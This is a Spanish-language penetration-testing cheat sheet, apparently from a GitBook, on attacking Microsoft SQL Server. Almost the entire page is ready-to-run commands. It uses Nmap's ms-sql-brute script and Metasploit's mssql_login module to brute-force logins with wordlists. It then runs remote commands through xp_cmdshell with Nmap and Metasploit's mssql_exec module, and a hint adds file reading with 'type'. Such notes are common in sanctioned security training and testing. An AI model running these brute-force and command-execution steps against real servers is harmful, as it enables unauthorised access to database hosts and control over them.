# MsSQL

## Fuerza Bruta

### Nmap

Podemos hacer uso de Nmap para hacerle fuerza bruta a este servicio:

```bash
nmap -p 1433 --script ms-sql-brute --script-args userdb=/root/Desktop/wordlist/common_users.txt,passdb=/root/Desktop/wordlist/100-common-passwords.txt 192.168.1.1
```

<figure><img src="../../.gitbook/assets/image (3) (1).png" alt=""><figcaption></figcaption></figure>

### Metasploit

Para hacer fuerza bruta usaremos los siguientes modulos:

<pre class="language-perl"><code class="lang-perl"><strong>msfconsole
</strong><strong>
</strong><strong>use auxiliary/scanner/mssql/mssql_login
</strong>
set RHOSTS 192.168.1.1

set USER_FILE /root/Desktop/wordlist/common_users.txt

set PASS_FILE /root/Desktop/wordlist/100-common-passwords.txt

set VERBOSE false

exploit
</code></pre>

<figure><img src="../../.gitbook/assets/image (96).png" alt=""><figcaption></figcaption></figure>

## RCE

### Nmap

Podemos hacer un RCE si tenemos credenciales de acceso y los permisos necesarios. Usaremos un script de nmap para ello:

{% hint style="success" %}
Podemos hacer uso del comando "type" para leer archivos de la maquina
{% endhint %}

```bash
nmap -p 1433 --script ms-sql-xp-cmdshell --script-args mssql.username=usuario,mssql.password=contraseña,ms-sql-xp-cmdshell.cmd="whoami" 192.168.1.1
```

<figure><img src="../../.gitbook/assets/image (6).png" alt=""><figcaption></figcaption></figure>

### Metasploit

Otra de las opciones es hacer el RCE mediante este modulo de metasploit:

```perl
msfconsole

use auxiliary/admin/mssql/mssql_exec

set RHOSTS 10.0.20.101

set CMD whoami

exploit
```

<figure><img src="../../.gitbook/assets/image (98).png" alt=""><figcaption></figcaption></figure>
